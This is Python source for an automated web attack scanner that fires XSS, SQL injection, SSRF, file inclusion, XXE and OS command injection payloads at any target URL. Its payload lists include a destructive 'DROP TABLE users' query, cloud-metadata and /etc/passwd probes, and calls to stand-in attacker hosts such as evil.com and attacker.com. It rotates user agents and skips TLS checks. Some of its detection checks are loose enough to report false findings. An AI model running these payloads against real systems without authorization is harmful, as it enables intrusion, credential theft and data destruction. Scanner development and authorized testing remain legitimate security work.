"""
ReconBuster Advanced Vulnerability Scanner
XSS, SQLi, LFI, RCE, SSRF, XXE Detection
"""

import asyncio
import aiohttp
import re
import hashlib
import base64
import random
import string
import html
from typing import List, Dict, Set, Callable, Optional, Tuple, Any
from dataclasses import dataclass, field
from urllib.parse import urlparse, urljoin, quote, parse_qs, urlencode
from datetime import datetime
from .utils import AsyncHTTPClient, normalize_url, USER_AGENTS

@dataclass
class VulnResult:
    """Vulnerability result with detailed info"""
    url: str
    vuln_type: str
    severity: str  # critical, high, medium, low, info
    title: str
    description: str
    payload: str = ""
    evidence: str = ""
    request: str = ""
    response: str = ""
    remediation: str = ""
    cwe: str = ""
    cvss: float = 0.0
    owasp: str = ""
    verified: bool = False
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


class XSSScanner:
    """Cross-Site Scripting (XSS) Scanner"""

    # XSS Payloads - Categorized
    PAYLOADS = {
        "basic": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(`XSS`)'></iframe>",
        ],
        "encoded": [
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "%253Cscript%253Ealert('XSS')%253C/script%253E",
        ],
        "event_handlers": [
            '" onmouseover="alert(\'XSS\')" x="',
            "' onfocus='alert(`XSS`)' autofocus='",
            '" onclick="alert(\'XSS\')"',
            "' onload='alert(`XSS`)'",
            '" onerror="alert(\'XSS\')" src=x',
        ],
        "polyglot": [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            "--!><img src=x onerror=alert(1)//",
            "'\"><img src=x onerror=alert(1)>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        ],
        "dom_based": [
            "#<img src=x onerror=alert('XSS')>",
            "?default=<script>alert(document.domain)</script>",
            "javascript:alert(document.cookie)",
        ],
        "filter_bypass": [
            "<svg/onload=alert('XSS')>",
            "<SVG ONLOAD=alert('XSS')>",
            "<svg onload=alert&#40;'XSS'&#41;>",
            "<<script>alert('XSS')//<</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<input type=image src=x onerror=alert('XSS')>",
            "<video><source onerror=\"alert('XSS')\">",
            "<audio src=x onerror=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<object data=\"javascript:alert('XSS')\">",
            "<embed src=\"javascript:alert('XSS')\">",
            "<a href=\"javascript:alert('XSS')\">click</a>",
            "<math><maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:alert('XSS')\">click</maction></math>",
        ]
    }

    # XSS Detection signatures
    DETECTION_SIGNATURES = [
        "alert('XSS')",
        "alert(`XSS`)",
        'alert("XSS")',
        "alert(1)",
        "alert(document",
        "onerror=alert",
        "onload=alert",
        "onclick=alert",
        "onmouseover=alert",
    ]

    def __init__(self, target: str, callback: Callable = None,
                 threads: int = 20, timeout: int = 10):
        self.target = normalize_url(target)
        self.callback = callback
        self.threads = threads
        self.timeout = timeout
        self.vulnerabilities: List[VulnResult] = []
        self.tested_params: Set[str] = set()

    async def emit(self, event: str, data: dict):
        if self.callback:
            await self.callback(event, data)

    async def scan(self, params: Dict[str, str] = None) -> List[VulnResult]:
        """Main XSS scanning method"""
        await self.emit("status", {"message": "Starting XSS scan..."})

        # Extract parameters from URL
        parsed = urlparse(self.target)
        url_params = parse_qs(parsed.query)

        if params:
            url_params.update(params)

        # Test each parameter
        for param, values in url_params.items():
            await self._test_parameter(param, values[0] if values else "")

        # Test common parameter names if none found
        if not url_params:
            common_params = ["q", "search", "query", "id", "page", "name",
                          "input", "data", "text", "message", "content",
                          "url", "redirect", "return", "next", "callback"]
            for param in common_params:
                await self._test_parameter(param, "test")

        await self.emit("xss_complete", {
            "vulnerabilities": [v.__dict__ for v in self.vulnerabilities],
            "count": len(self.vulnerabilities)
        })

        return self.vulnerabilities

    async def _test_parameter(self, param: str, original_value: str):
        """Test a single parameter for XSS"""
        semaphore = asyncio.Semaphore(self.threads)

        async def test_payload(category: str, payload: str):
            async with semaphore:
                # Build test URL
                parsed = urlparse(self.target)
                params = parse_qs(parsed.query)
                params[param] = [payload]

                new_query = urlencode(params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(
                            test_url,
                            timeout=aiohttp.ClientTimeout(total=self.timeout),
                            ssl=False,
                            headers={"User-Agent": random.choice(USER_AGENTS)}
                        ) as resp:
                            content = await resp.text()

                            # Check if payload is reflected
                            if self._is_xss_reflected(payload, content):
                                vuln = VulnResult(
                                    url=test_url,
                                    vuln_type="xss",
                                    severity="high" if category in ["polyglot", "dom_based"] else "medium",
                                    title=f"Reflected XSS in parameter '{param}'",
                                    description=f"The parameter '{param}' is vulnerable to {category} XSS attack. User input is reflected in the response without proper sanitization.",
                                    payload=payload,
                                    evidence=f"Payload reflected in response",
                                    remediation="Implement proper input validation and output encoding. Use Content-Security-Policy headers.",
                                    cwe="CWE-79",
                                    cvss=6.1,
                                    owasp="A03:2021 - Injection",
                                    verified=True
                                )
                                self.vulnerabilities.append(vuln)
                                await self.emit("xss_found", vuln.__dict__)
                                return True
                except Exception:
                    pass
                return False

        tasks = []
        for category, payloads in self.PAYLOADS.items():
            for payload in payloads:
                tasks.append(test_payload(category, payload))

        await asyncio.gather(*tasks, return_exceptions=True)

    def _is_xss_reflected(self, payload: str, content: str) -> bool:
        """Check if XSS payload is reflected in response"""
        # Direct reflection
        if payload in content:
            return True

        # Check for partial reflection
        for sig in self.DETECTION_SIGNATURES:
            if sig in content:
                return True

        # HTML decoded check
        try:
            decoded = html.unescape(content)
            if payload in decoded:
                return True
        except:
            pass

        return False


class SQLiScanner:
    """SQL Injection Scanner"""

    # SQLi Payloads
    PAYLOADS = {
        "error_based": [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "1 AND 1=1",
            "1 AND 1=2",
            "1' AND '1'='1",
            "1' AND '1'='2",
        ],
        "blind_boolean": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
            "1 AND SUBSTRING((SELECT 1),1,1)='1'",
            "' OR SUBSTRING(username,1,1)='a'--",
        ],
        "blind_time": [
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT SLEEP(5)--",
            "' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; SELECT pg_sleep(5)--",
            "' || pg_sleep(5)--",
        ],
        "union_based": [
            "' UNION SELECT 1--",
            "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT 1,2,3--",
            "0 UNION SELECT 1,2,3--",
        ],
        "stacked_queries": [
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES('hacked')--",
            "1; SELECT * FROM users--",
        ],
    }

    # SQL Error signatures
    SQL_ERRORS = [
        # MySQL
        "you have an error in your sql syntax",
        "warning: mysql",
        "mysql_fetch",
        "mysql_num_rows",
        "mysql_query",
        "mysqli_",
        "SQL syntax.*?MySQL",

        # PostgreSQL
        "pg_query",
        "pg_exec",
        "postgresql",
        "PG::SyntaxError",
        "PSQLException",

        # MSSQL
        "microsoft sql server",
        "sql server",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "mssql_query",
        "odbc_exec",

        # Oracle
        "ora-00933",
        "ora-00921",
        "ora-01756",
        "oracle error",
        "ORA-",

        # SQLite
        "sqlite_query",
        "sqlite3::",
        "SQLITE_ERROR",
        "SQLite3::SQLException",

        # Generic
        "sql syntax",
        "sql error",
        "syntax error",
        "query failed",
        "database error",
        "db error",
    ]

    def __init__(self, target: str, callback: Callable = None,
                 threads: int = 15, timeout: int = 15):
        self.target = normalize_url(target)
        self.callback = callback
        self.threads = threads
        self.timeout = timeout
        self.vulnerabilities: List[VulnResult] = []
        self.baseline_response = None
        self.baseline_length = 0

    async def emit(self, event: str, data: dict):
        if self.callback:
            await self.callback(event, data)

    async def scan(self, params: Dict[str, str] = None) -> List[VulnResult]:
        """Main SQLi scanning method"""
        await self.emit("status", {"message": "Starting SQL Injection scan..."})

        # Get baseline response
        await self._get_baseline()

        # Extract parameters
        parsed = urlparse(self.target)
        url_params = parse_qs(parsed.query)

        if params:
            url_params.update(params)

        # Test each parameter
        for param, values in url_params.items():
            await self._test_parameter(param, values[0] if values else "")

        await self.emit("sqli_complete", {
            "vulnerabilities": [v.__dict__ for v in self.vulnerabilities],
            "count": len(self.vulnerabilities)
        })

        return self.vulnerabilities

    async def _get_baseline(self):
        """Get baseline response for comparison"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    self.target,
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    ssl=False
                ) as resp:
                    self.baseline_response = await resp.text()
                    self.baseline_length = len(self.baseline_response)
        except:
            pass

    async def _test_parameter(self, param: str, original_value: str):
        """Test parameter for SQL injection"""
        semaphore = asyncio.Semaphore(self.threads)

        async def test_payload(category: str, payload: str):
            async with semaphore:
                parsed = urlparse(self.target)
                params = parse_qs(parsed.query)
                params[param] = [payload]

                new_query = urlencode(params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                try:
                    start_time = asyncio.get_event_loop().time()

                    async with aiohttp.ClientSession() as session:
                        async with session.get(
                            test_url,
                            timeout=aiohttp.ClientTimeout(total=self.timeout),
                            ssl=False,
                            headers={"User-Agent": random.choice(USER_AGENTS)}
                        ) as resp:
                            content = await resp.text()
                            response_time = asyncio.get_event_loop().time() - start_time

                            # Check for SQL errors
                            if self._has_sql_error(content):
                                vuln = VulnResult(
                                    url=test_url,
                                    vuln_type="sqli",
                                    severity="critical",
                                    title=f"SQL Injection (Error-Based) in '{param}'",
                                    description=f"The parameter '{param}' is vulnerable to SQL injection. SQL errors are visible in the response.",
                                    payload=payload,
                                    evidence="SQL error message found in response",
                                    remediation="Use parameterized queries/prepared statements. Implement input validation.",
                                    cwe="CWE-89",
                                    cvss=9.8,
                                    owasp="A03:2021 - Injection",
                                    verified=True
                                )
                                self.vulnerabilities.append(vuln)
                                await self.emit("sqli_found", vuln.__dict__)
                                return

                            # Check for time-based blind
                            if category == "blind_time" and response_time >= 5:
                                vuln = VulnResult(
                                    url=test_url,
                                    vuln_type="sqli",
                                    severity="critical",
                                    title=f"SQL Injection (Time-Based Blind) in '{param}'",
                                    description=f"The parameter '{param}' is vulnerable to time-based blind SQL injection.",
                                    payload=payload,
                                    evidence=f"Response delayed by {response_time:.2f}s",
                                    remediation="Use parameterized queries/prepared statements.",
                                    cwe="CWE-89",
                                    cvss=9.8,
                                    owasp="A03:2021 - Injection",
                                    verified=True
                                )
                                self.vulnerabilities.append(vuln)
                                await self.emit("sqli_found", vuln.__dict__)
                                return

                            # Check for boolean-based blind (response length difference)
                            if category == "blind_boolean":
                                if abs(len(content) - self.baseline_length) > 100:
                                    vuln = VulnResult(
                                        url=test_url,
                                        vuln_type="sqli",
                                        severity="high",
                                        title=f"Potential SQL Injection (Boolean-Based) in '{param}'",
                                        description=f"The parameter '{param}' shows different responses for boolean conditions.",
                                        payload=payload,
                                        evidence=f"Response length difference: {abs(len(content) - self.baseline_length)} bytes",
                                        remediation="Use parameterized queries/prepared statements.",
                                        cwe="CWE-89",
                                        cvss=8.6,
                                        owasp="A03:2021 - Injection",
                                        verified=False
                                    )
                                    self.vulnerabilities.append(vuln)
                                    await self.emit("sqli_potential", vuln.__dict__)

                except Exception:
                    pass

        tasks = []
        for category, payloads in self.PAYLOADS.items():
            for payload in payloads[:5]:  # Limit payloads per category
                tasks.append(test_payload(category, payload))

        await asyncio.gather(*tasks, return_exceptions=True)

    def _has_sql_error(self, content: str) -> bool:
        """Check for SQL error messages"""
        content_lower = content.lower()
        for error in self.SQL_ERRORS:
            if error.lower() in content_lower:
                return True
        return False


class SSRFScanner:
    """Server-Side Request Forgery Scanner"""

    # SSRF Payloads
    PAYLOADS = [
        # Localhost variations
        "http://127.0.0.1/",
        "http://localhost/",
        "http://127.0.0.1:80/",
        "http://127.0.0.1:443/",
        "http://127.0.0.1:22/",
        "http://127.0.0.1:3306/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://0/",

        # IP obfuscation
        "http://2130706433/",  # 127.0.0.1 decimal
        "http://0x7f000001/",  # Hex
        "http://0177.0.0.1/",  # Octal
        "http://127.1/",
        "http://127.0.1/",

        # Cloud metadata
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/api/token",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        "http://100.100.100.200/latest/meta-data/",

        # Internal services
        "http://192.168.0.1/",
        "http://192.168.1.1/",
        "http://10.0.0.1/",
        "http://172.16.0.1/",

        # Protocol smuggling
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "dict://127.0.0.1:11211/",
        "gopher://127.0.0.1:25/",
        "ftp://127.0.0.1/",

        # DNS rebinding
        "http://localtest.me/",
        "http://spoofed.burpcollaborator.net/",
    ]

    # Common SSRF parameters
    SSRF_PARAMS = [
        "url", "uri", "path", "dest", "redirect", "target", "proxy",
        "domain", "continue", "redirect_uri", "return", "next",
        "page", "view", "img", "image", "load", "download", "file",
        "fetch", "api", "site", "html", "reference", "src", "href"
    ]

    def __init__(self, target: str, callback: Callable = None,
                 threads: int = 15, timeout: int = 10):
        self.target = normalize_url(target)
        self.callback = callback
        self.threads = threads
        self.timeout = timeout
        self.vulnerabilities: List[VulnResult] = []

    async def emit(self, event: str, data: dict):
        if self.callback:
            await self.callback(event, data)

    async def scan(self, params: Dict[str, str] = None) -> List[VulnResult]:
        """Main SSRF scanning method"""
        await self.emit("status", {"message": "Starting SSRF scan..."})

        # Extract parameters
        parsed = urlparse(self.target)
        url_params = parse_qs(parsed.query)

        # Add common SSRF parameters
        for param in self.SSRF_PARAMS:
            if param not in url_params:
                url_params[param] = [""]

        if params:
            url_params.update(params)

        # Test each parameter
        for param in url_params.keys():
            await self._test_parameter(param)

        await self.emit("ssrf_complete", {
            "vulnerabilities": [v.__dict__ for v in self.vulnerabilities],
            "count": len(self.vulnerabilities)
        })

        return self.vulnerabilities

    async def _test_parameter(self, param: str):
        """Test parameter for SSRF"""
        semaphore = asyncio.Semaphore(self.threads)

        async def test_payload(payload: str):
            async with semaphore:
                parsed = urlparse(self.target)
                params = parse_qs(parsed.query)
                params[param] = [payload]

                new_query = urlencode(params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(
                            test_url,
                            timeout=aiohttp.ClientTimeout(total=self.timeout),
                            ssl=False,
                            headers={"User-Agent": random.choice(USER_AGENTS)}
                        ) as resp:
                            content = await resp.text()

                            # Check for SSRF indicators
                            if self._is_ssrf_successful(payload, content, resp.status):
                                severity = "critical" if "169.254.169.254" in payload else "high"

                                vuln = VulnResult(
                                    url=test_url,
                                    vuln_type="ssrf",
                                    severity=severity,
                                    title=f"Server-Side Request Forgery in '{param}'",
                                    description=f"The parameter '{param}' is vulnerable to SSRF, allowing access to internal resources.",
                                    payload=payload,
                                    evidence=f"Internal resource accessed successfully",
                                    remediation="Implement URL whitelisting. Block requests to internal networks and metadata services.",
                                    cwe="CWE-918",
                                    cvss=9.1 if severity == "critical" else 7.5,
                                    owasp="A10:2021 - SSRF",
                                    verified=True
                                )
                                self.vulnerabilities.append(vuln)
                                await self.emit("ssrf_found", vuln.__dict__)

                except Exception:
                    pass

        tasks = [test_payload(p) for p in self.PAYLOADS]
        await asyncio.gather(*tasks, return_exceptions=True)

    def _is_ssrf_successful(self, payload: str, content: str, status: int) -> bool:
        """Check if SSRF was successful"""
        indicators = [
            # Linux files
            "root:", "/bin/bash",
            # Windows files
            "[fonts]", "[extensions]",
            # AWS metadata
            "ami-id", "instance-id", "security-credentials",
            # GCP metadata
            "computeMetadata",
            # Internal services
            "localhost", "127.0.0.1",
        ]

        content_lower = content.lower()
        for indicator in indicators:
            if indicator.lower() in content_lower:
                return True

        # Check for different response
        if status == 200 and len(content) > 0:
            if "169.254.169.254" in payload:
                return True

        return False


class LFIRFIScanner:
    """Local/Remote File Inclusion Scanner"""

    # LFI Payloads
    LFI_PAYLOADS = [
        # Basic traversal
        ("../../../../../../../etc/passwd", "root:"),
        ("....//....//....//....//....//etc/passwd", "root:"),
        ("..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd", "root:"),
        ("..%252f..%252f..%252f..%252fetc/passwd", "root:"),
        ("/etc/passwd", "root:"),
        ("file:///etc/passwd", "root:"),

        # PHP wrappers
        ("php://filter/convert.base64-encode/resource=index.php", "PD9waHA"),
        ("php://filter/read=string.rot13/resource=index.php", "<?cuc"),
        ("php://input", ""),
        ("data://text/plain,<?php phpinfo();?>", ""),
        ("expect://id", "uid="),

        # Windows files
        ("../../../../../../../windows/win.ini", "[fonts]"),
        ("..\\..\\..\\..\\..\\..\\windows\\win.ini", "[fonts]"),
        ("....\\....\\....\\....\\windows\\win.ini", "[fonts]"),
        ("C:/windows/win.ini", "[fonts]"),
        ("C:\\windows\\win.ini", "[fonts]"),
        ("..%5c..%5c..%5c..%5cwindows/win.ini", "[fonts]"),

        # Null byte injection (older PHP)
        ("../../../etc/passwd%00", "root:"),
        ("../../../etc/passwd\x00", "root:"),
        ("../../../etc/passwd%00.jpg", "root:"),

        # Path truncation
        ("....//....//....//....//etc/passwd", "root:"),
        ("..././..././..././..././etc/passwd", "root:"),
    ]

    # RFI Payloads
    RFI_PAYLOADS = [
        "http://evil.com/shell.txt",
        "https://pastebin.com/raw/xxx",
        "//evil.com/shell.txt",
        "\\\\evil.com\\shell.txt",
    ]

    # Vulnerable parameters
    VULN_PARAMS = [
        "file", "path", "page", "include", "doc", "document",
        "folder", "root", "pg", "style", "pdf", "template",
        "php_path", "action", "cat", "dir", "load", "read",
        "filename", "filepath", "download", "img", "image",
        "lang", "language", "locale", "content", "view"
    ]

    def __init__(self, target: str, callback: Callable = None,
                 threads: int = 20, timeout: int = 10):
        self.target = normalize_url(target)
        self.callback = callback
        self.threads = threads
        self.timeout = timeout
        self.vulnerabilities: List[VulnResult] = []

    async def emit(self, event: str, data: dict):
        if self.callback:
            await self.callback(event, data)

    async def scan(self, params: Dict[str, str] = None) -> List[VulnResult]:
        """Main LFI/RFI scanning method"""
        await self.emit("status", {"message": "Starting LFI/RFI scan..."})

        # Extract parameters
        parsed = urlparse(self.target)
        url_params = parse_qs(parsed.query)

        # Add vulnerable parameters
        for param in self.VULN_PARAMS:
            if param not in url_params:
                url_params[param] = [""]

        if params:
            url_params.update(params)

        # Test each parameter
        for param in url_params.keys():
            await self._test_lfi(param)

        await self.emit("lfi_complete", {
            "vulnerabilities": [v.__dict__ for v in self.vulnerabilities],
            "count": len(self.vulnerabilities)
        })

        return self.vulnerabilities

    async def _test_lfi(self, param: str):
        """Test parameter for LFI"""
        semaphore = asyncio.Semaphore(self.threads)

        async def test_payload(payload: str, signature: str):
            async with semaphore:
                parsed = urlparse(self.target)
                params = parse_qs(parsed.query)
                params[param] = [payload]

                new_query = urlencode(params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(
                            test_url,
                            timeout=aiohttp.ClientTimeout(total=self.timeout),
                            ssl=False,
                            headers={"User-Agent": random.choice(USER_AGENTS)}
                        ) as resp:
                            content = await resp.text()

                            if signature and signature.lower() in content.lower():
                                vuln = VulnResult(
                                    url=test_url,
                                    vuln_type="lfi",
                                    severity="critical",
                                    title=f"Local File Inclusion in '{param}'",
                                    description=f"The parameter '{param}' is vulnerable to LFI, allowing access to local files.",
                                    payload=payload,
                                    evidence=f"Signature '{signature}' found in response",
                                    remediation="Validate and sanitize file paths. Use whitelisting for allowed files.",
                                    cwe="CWE-98",
                                    cvss=9.8,
                                    owasp="A03:2021 - Injection",
                                    verified=True
                                )
                                self.vulnerabilities.append(vuln)
                                await self.emit("lfi_found", vuln.__dict__)

                except Exception:
                    pass

        tasks = [test_payload(p, s) for p, s in self.LFI_PAYLOADS]
        await asyncio.gather(*tasks, return_exceptions=True)


class XXEScanner:
    """XML External Entity Injection Scanner"""

    # XXE Payloads
    PAYLOADS = [
        # Basic XXE
        '''<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <root>&xxe;</root>''',

        # Parameter entity
        '''<?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
        <root></root>''',

        # SSRF via XXE
        '''<?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
        <root>&xxe;</root>''',

        # Blind XXE with external DTD
        '''<?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
        <root></root>''',

        # XXE via XInclude
        '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
        <xi:include parse="text" href="file:///etc/passwd"/>
        </foo>''',
    ]

    def __init__(self, target: str, callback: Callable = None,
                 timeout: int = 10):
        self.target = normalize_url(target)
        self.callback = callback
        self.timeout = timeout
        self.vulnerabilities: List[VulnResult] = []

    async def emit(self, event: str, data: dict):
        if self.callback:
            await self.callback(event, data)

    async def scan(self) -> List[VulnResult]:
        """Main XXE scanning method"""
        await self.emit("status", {"message": "Starting XXE scan..."})

        for payload in self.PAYLOADS:
            await self._test_xxe(payload)

        await self.emit("xxe_complete", {
            "vulnerabilities": [v.__dict__ for v in self.vulnerabilities],
            "count": len(self.vulnerabilities)
        })

        return self.vulnerabilities

    async def _test_xxe(self, payload: str):
        """Test for XXE vulnerability"""
        headers = {
            "Content-Type": "application/xml",
            "User-Agent": random.choice(USER_AGENTS)
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    self.target,
                    data=payload,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    ssl=False
                ) as resp:
                    content = await resp.text()

                    # Check for XXE indicators
                    indicators = ["root:", "/bin/bash", "[fonts]", "ami-id", "instance-id"]
                    for indicator in indicators:
                        if indicator in content:
                            vuln = VulnResult(
                                url=self.target,
                                vuln_type="xxe",
                                severity="critical",
                                title="XML External Entity Injection",
                                description="The application processes XML input and is vulnerable to XXE attacks.",
                                payload=payload[:100] + "...",
                                evidence=f"Indicator '{indicator}' found",
                                remediation="Disable external entity processing. Use JSON instead of XML.",
                                cwe="CWE-611",
                                cvss=9.1,
                                owasp="A03:2021 - Injection",
                                verified=True
                            )
                            self.vulnerabilities.append(vuln)
                            await self.emit("xxe_found", vuln.__dict__)
                            return

        except Exception:
            pass


class CommandInjectionScanner:
    """OS Command Injection Scanner"""

    # Command Injection Payloads
    PAYLOADS = {
        "linux": [
            "; id",
            "| id",
            "|| id",
            "&& id",
            "& id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; sleep 5",
            "| sleep 5",
            "|| sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "; ping -c 5 127.0.0.1",
            "| ping -c 5 127.0.0.1",
        ],
        "windows": [
            "& dir",
            "| dir",
            "|| dir",
            "&& dir",
            "; dir",
            "& type C:\\windows\\win.ini",
            "| type C:\\windows\\win.ini",
            "& ping -n 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
        ],
        "blind": [
            "; sleep 5 #",
            "| sleep 5 #",
            "`sleep 5`",
            "$(sleep 5)",
            "& ping -n 5 127.0.0.1 &",
            "| ping -c 5 127.0.0.1 |",
        ]
    }

    # Command execution signatures
    SIGNATURES = [
        "uid=", "gid=", "groups=",  # Linux id command
        "root:", "/bin/bash",  # /etc/passwd
        "[fonts]", "[extensions]",  # win.ini
        "Volume Serial Number",  # dir command
        "Directory of",  # dir command
    ]

    def __init__(self, target: str, callback: Callable = None,
                 threads: int = 15, timeout: int = 15):
        self.target = normalize_url(target)
        self.callback = callback
        self.threads = threads
        self.timeout = timeout
        self.vulnerabilities: List[VulnResult] = []

    async def emit(self, event: str, data: dict):
        if self.callback:
            await self.callback(event, data)

    async def scan(self, params: Dict[str, str] = None) -> List[VulnResult]:
        """Main command injection scan"""
        await self.emit("status", {"message": "Starting Command Injection scan..."})

        # Extract parameters
        parsed = urlparse(self.target)
        url_params = parse_qs(parsed.query)

        if params:
            url_params.update(params)

        # Test each parameter
        for param in url_params.keys():
            await self._test_parameter(param)

        await self.emit("cmdi_complete", {
            "vulnerabilities": [v.__dict__ for v in self.vulnerabilities],
            "count": len(self.vulnerabilities)
        })

        return self.vulnerabilities

    async def _test_parameter(self, param: str):
        """Test parameter for command injection"""
        semaphore = asyncio.Semaphore(self.threads)

        async def test_payload(category: str, payload: str):
            async with semaphore:
                parsed = urlparse(self.target)
                params = parse_qs(parsed.query)
                params[param] = [payload]

                new_query = urlencode(params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                try:
                    start_time = asyncio.get_event_loop().time()

                    async with aiohttp.ClientSession() as session:
                        async with session.get(
                            test_url,
                            timeout=aiohttp.ClientTimeout(total=self.timeout),
                            ssl=False,
                            headers={"User-Agent": random.choice(USER_AGENTS)}
                        ) as resp:
                            content = await resp.text()
                            response_time = asyncio.get_event_loop().time() - start_time

                            # Check for command output
                            for sig in self.SIGNATURES:
                                if sig in content:
                                    vuln = VulnResult(
                                        url=test_url,
                                        vuln_type="command_injection",
                                        severity="critical",
                                        title=f"OS Command Injection in '{param}'",
                                        description=f"The parameter '{param}' is vulnerable to OS command injection.",
                                        payload=payload,
                                        evidence=f"Command output signature '{sig}' found",
                                        remediation="Never pass user input directly to system commands. Use safe APIs.",
                                        cwe="CWE-78",
                                        cvss=10.0,
                                        owasp="A03:2021 - Injection",
                                        verified=True
                                    )
                                    self.vulnerabilities.append(vuln)
                                    await self.emit("cmdi_found", vuln.__dict__)
                                    return

                            # Check for time-based blind
                            if category == "blind" and response_time >= 5:
                                vuln = VulnResult(
                                    url=test_url,
                                    vuln_type="command_injection",
                                    severity="critical",
                                    title=f"Blind OS Command Injection in '{param}'",
                                    description=f"Time-based command injection detected in '{param}'.",
                                    payload=payload,
                                    evidence=f"Response delayed by {response_time:.2f}s",
                                    remediation="Never pass user input directly to system commands.",
                                    cwe="CWE-78",
                                    cvss=10.0,
                                    owasp="A03:2021 - Injection",
                                    verified=True
                                )
                                self.vulnerabilities.append(vuln)
                                await self.emit("cmdi_found", vuln.__dict__)

                except Exception:
                    pass

        tasks = []
        for category, payloads in self.PAYLOADS.items():
            for payload in payloads:
                tasks.append(test_payload(category, payload))

        await asyncio.gather(*tasks, return_exceptions=True)


class AdvancedScanner:
    """
    Master class that orchestrates all advanced scanning modules
    """

    def __init__(self, target: str, callback: Callable = None,
                 threads: int = 20, timeout: int = 15):
        self.target = normalize_url(target)
        self.callback = callback
        self.threads = threads
        self.timeout = timeout
        self.all_vulnerabilities: List[VulnResult] = []

    async def emit(self, event: str, data: dict):
        if self.callback:
            await self.callback(event, data)

    async def full_scan(self, scan_types: List[str] = None) -> List[VulnResult]:
        """Run all selected scan types"""
        if scan_types is None:
            scan_types = ["xss", "sqli", "ssrf", "lfi", "xxe", "cmdi"]

        await self.emit("status", {"message": f"Starting advanced scan on {self.target}"})

        tasks = []

        if "xss" in scan_types:
            xss = XSSScanner(self.target, self.callback, self.threads, self.timeout)
            tasks.append(xss.scan())

        if "sqli" in scan_types:
            sqli = SQLiScanner(self.target, self.callback, self.threads, self.timeout)
            tasks.append(sqli.scan())

        if "ssrf" in scan_types:
            ssrf = SSRFScanner(self.target, self.callback, self.threads, self.timeout)
            tasks.append(ssrf.scan())

        if "lfi" in scan_types:
            lfi = LFIRFIScanner(self.target, self.callback, self.threads, self.timeout)
            tasks.append(lfi.scan())

        if "xxe" in scan_types:
            xxe = XXEScanner(self.target, self.callback, self.timeout)
            tasks.append(xxe.scan())

        if "cmdi" in scan_types:
            cmdi = CommandInjectionScanner(self.target, self.callback, self.threads, self.timeout)
            tasks.append(cmdi.scan())

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, list):
                self.all_vulnerabilities.extend(result)

        await self.emit("advanced_scan_complete", {
            "total_vulnerabilities": len(self.all_vulnerabilities),
            "critical": len([v for v in self.all_vulnerabilities if v.severity == "critical"]),
            "high": len([v for v in self.all_vulnerabilities if v.severity == "high"]),
            "medium": len([v for v in self.all_vulnerabilities if v.severity == "medium"]),
            "low": len([v for v in self.all_vulnerabilities if v.severity == "low"]),
        })

        return self.all_vulnerabilities
